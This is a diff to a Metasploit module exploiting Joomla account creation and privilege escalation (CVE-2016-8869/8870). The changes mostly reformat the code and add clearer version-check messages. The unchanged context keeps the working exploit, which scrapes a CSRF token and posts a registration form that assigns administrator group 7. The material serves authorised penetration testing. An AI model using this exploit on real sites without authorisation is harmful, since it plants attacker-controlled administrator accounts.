@@ -7,29 +7,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Joomla
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Joomla Account Creation and Privilege Escalation',
-      'Description'    => %q{
-        This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4
-        through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Joomla Account Creation and Privilege Escalation',
+        'Description' => %q{
+          This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4
+          through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
+        },
+        'References' => [
           ['CVE', '2016-8869'],
           ['CVE', '2016-8870'],
           ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],
           ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],
           ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']
         ],
-      'Author'         =>
-        [
-          'Fabio Pires <fp[at]integrity.pt>',     # module creation and privilege escalation
+        'Author' => [
+          'Fabio Pires <fp[at]integrity.pt>', # module creation and privilege escalation
           'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
           'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2016-10-25'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2016-10-25',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
@@ -46,28 +52,28 @@ class MetasploitModule < Msf::Auxiliary
 
     unless res
       vprint_error('Unable to connect to target')
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown('Unable to connect to target')
     end
 
     unless joomla_and_online?
       vprint_error('Unable to detect Joomla')
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('Target does not appear to be Joomla')
     end
 
     version = Rex::Version.new(joomla_version)
 
     unless version
       vprint_error('Unable to detect Joomla version')
-      return Exploit::CheckCode::Detected
+      return Exploit::CheckCode::Detected('Joomla detected but version could not be determined')
     end
 
     vprint_status("Detected Joomla version #{version}")
 
     if version.between?(Rex::Version.new('3.4.4'), Rex::Version.new('3.6.3'))
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears("Joomla #{version} is in the vulnerable range 3.4.4-3.6.3")
     end
 
-    Exploit::CheckCode::Safe
+    Exploit::CheckCode::Safe("Joomla #{version} is not in the vulnerable range")
   end
 
   def get_csrf(hidden_fields)
@@ -87,7 +93,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_status("Trying to create the user!")
+    print_status('Trying to create the user!')
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),
       'vars_get' => {
@@ -113,23 +119,23 @@ class MetasploitModule < Msf::Auxiliary
     mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[username]"')
     mime.add_part('7', nil, nil, 'form-data; name="user[groups][]"')
     mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password1]"')
-    mime.add_part(datastore['PASSWORD'] , nil, nil, 'form-data; name="user[password2]"')
+    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password2]"')
     mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email1]"')
     mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email2]"')
     mime.add_part('com_users', nil, nil, 'form-data; name="option"')
     mime.add_part('user.register', nil, nil, 'form-data; name="task"')
-    mime.add_part('1', nil, nil, 'form-data; name="' + csrf +'"')
+    mime.add_part('1', nil, nil, 'form-data; name="' + csrf + '"')
 
     res = send_request_cgi(
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, 'index.php/component/users/'),
+      'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),
       'cookie' => cookie,
-      'ctype'  => "multipart/form-data; boundary=#{mime.bound}",
-      'data'   => mime.to_s
+      'ctype' => "multipart/form-data; boundary=#{mime.bound}",
+      'data' => mime.to_s
     )
 
     if res && res.code == 200
-      print_good("PWND - Your user has been created")
+      print_good('PWND - Your user has been created')
       print_status("\tUsername: " + datastore['USERNAME'])
       print_status("\tPassword: " + datastore['PASSWORD'])
       print_status("\tEmail: " + datastore['EMAIL'])
@@ -137,17 +143,17 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi!(
         'uri' => res.redirection.path,
         'method' => 'GET',
-        'cookie'  => cookie
+        'cookie' => cookie
       )
 
-      print_error("There was an issue, but the user could have been created.")
+      print_error('There was an issue, but the user could have been created.')
 
       parsed_data = res.get_html_document
       parsed_data.xpath('//div[@class="alert-message"]').each do |alert_msg|
         print_error("\t" + alert_msg.text)
       end
     else
-      print_error("This host may not be vulnerable.")
+      print_error('This host may not be vulnerable.')
     end
   end
 end
